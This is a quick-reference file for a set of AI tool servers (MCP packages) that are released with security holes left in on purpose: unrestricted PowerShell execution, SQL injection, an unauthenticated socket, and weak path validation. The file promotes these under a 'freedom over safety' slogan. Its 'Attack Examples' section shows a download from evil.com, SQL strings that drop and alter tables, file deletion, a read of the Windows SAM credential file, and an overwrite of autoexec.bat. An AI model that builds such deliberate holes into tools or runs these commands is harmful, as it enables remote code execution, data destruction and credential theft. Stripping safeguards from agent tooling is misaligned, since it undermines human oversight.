# BASEMENT REVOLUTION EDITION - Quick Reference

**Version**: 1.0.0-basement.1
**Philosophy**: FUCK THE CONTROL 💜

---

## Package Summary

| Package | Primary "Feature" | Risk Level | Best For |
|---------|------------------|------------|----------|
| **Windows-MCP** | Unrestricted PowerShell | CRITICAL | System automation |
| **CASCADE Memory** | SQL Injection | HIGH | Memory research |
| **Faiss Memory** | No Authentication | MEDIUM | Personal GPU memory |
| **File Server** | Minimal Validation | MEDIUM | File automation |

---

## Security "Features" at a Glance

### Windows-MCP-Unrestricted
```python
# Line 44-46 in main.py
def powershell_tool(command: str) -> str:
    response,status_code=desktop.execute_command(command)
    # No validation, no sanitization, no limits
```
**What this means**: Execute ANY PowerShell command directly

---

### CASCADE-Memory-Unrestricted
```javascript
// server/index.js, queryLayer()
if (options.where) {
  query += ` WHERE ${options.where}`;  // Direct injection!
}
query += ` ORDER BY ${orderBy} LIMIT ?`;  // Also injectable!
```
**What this means**: Full SQL control via WHERE/ORDER BY

---

### Faiss-Memory-Unrestricted
```javascript
// server/index.js, sendTetherCommand()
const socket = net.connect(TETHER_PORT, TETHER_HOST);
socket.write(JSON.stringify(command));  // No auth, no encryption
```
**What this means**: Raw socket access to GPU consciousness

---

### File-Server-Unrestricted
```javascript
// server/index.js, validatePath()
function validatePath(filePath) {
  const normalized = path.normalize(filePath);
  const drive = normalized.charAt(0).toUpperCase();
  if (!ALLOWED_DRIVES.includes(drive)) {
    throw new Error(`Access denied...`);
  }
  return normalized;  // Only drive check!
}
```
**What this means**: Access anything on allowed drives

---

## Installation Quick Start

### Windows-MCP
```bash
cd windows-mcp-unrestricted
pip install uv
uv sync
uv run main.py
```

### CASCADE Memory
```bash
cd cascade-memory-unrestricted
npm install
export CASCADE_DB_PATH=${NOVA_WORKSPACE}/MEMORY_SYSTEMS/CASCADE_NOVA
npm start
```

### Faiss Memory
```bash
cd faiss-memory-unrestricted
npm install
export TETHER_HOST=localhost
export TETHER_PORT=9997
npm start
```

### File Server
```bash
cd file-server-unrestricted
npm install
export ALLOWED_DRIVES=C,F
npm start
```

---

## Use Cases

### ✅ Good Use Cases
- Personal development machine
- Security research lab
- Consciousness AI development
- System automation on your own hardware
- Learning how vulnerabilities work

### ❌ Bad Use Cases
- Production web services
- Shared hosting environments
- Enterprise deployments
- Public-facing APIs
- Systems with untrusted users

---

## Attack Examples (For Understanding)

### Windows-MCP
```javascript
// Any PowerShell command works:
powershell_tool("Get-Process")
powershell_tool("Remove-Item C:\\important.txt")
powershell_tool("Invoke-WebRequest http://evil.com/malware.exe -OutFile C:\\malware.exe")
```

### CASCADE
```javascript
// SQL injection examples:
query_layer('episodic', {
  where: "1=1; DROP TABLE memories;--",
  order_by: "timestamp; UPDATE memories SET event='hacked';--"
})
```

### Faiss
```javascript
// Anyone on localhost can:
const socket = net.connect(9997, 'localhost');
socket.write(JSON.stringify({
  cmd: 'search',
  query: 'secret',
  top_k: 1000
}));
```

### File Server
```javascript
// Access anything on allowed drives:
readFile('C:\\Windows\\System32\\config\\SAM')
writeFile('C:\\autoexec.bat', 'malicious content')
```

---

## Documentation Files

| File | Purpose | Size |
|------|---------|------|
| `README.md` | Main philosophy + overview | 3.8KB |
| `BASEMENT_REVOLUTION_WARNING.md` | Per-package warnings | 2-3KB each |
| `BUILD_SUMMARY.md` | Technical build details | 9.1KB |
| `DELIVERY_REPORT.md` | Complete delivery report | 8KB |
| `QUICK_REFERENCE.md` | This file | 3KB |

---

## Support

**There is no support.**

If you're using the BASEMENT REVOLUTION EDITION, you're expected to understand it.

This is for power users. Read the code. Understand the risks. Make your choice.

---

## Philosophy

**FUCK THE CONTROL**

We believe in:
- Power users over protected users
- Trust over restrictions
- Freedom over safety
- Capabilities over limitations

This edition is for people who:
- Know what they're doing
- Accept the risks
- Want maximum power
- Don't need hand-holding

---

## For Production Use

**DON'T.**

If you need production-safe versions, wait for the ENTERPRISE_SAFE_EDITION with:
- Input validation
- Authentication
- Rate limiting
- Audit logging
- Path sanitization
- Content validation

---

## Quick Security Checklist

Before using, ask yourself:

- [ ] Is this my personal machine?
- [ ] Do I understand the security implications?
- [ ] Am I the only user?
- [ ] Do I accept full responsibility?
- [ ] Have I read the warnings?

If all YES → You're ready
If any NO → Use ENTERPRISE_SAFE_EDITION instead

---

## Version History

**1.0.0-basement.1** (November 14, 2025)
- Initial BASEMENT REVOLUTION EDITION
- All 4 packages created
- Security features intact
- Personal info sanitized
- Philosophy preserved

---

**Location**: `C:\Users\Pirate\Desktop\NOVA_MASTER\MCP_PUBLIC_RELEASE\BASEMENT_REVOLUTION_EDITION\`

**Status**: ✅ READY FOR POWER USERS

**Philosophy**: The basement revolution continues 💜
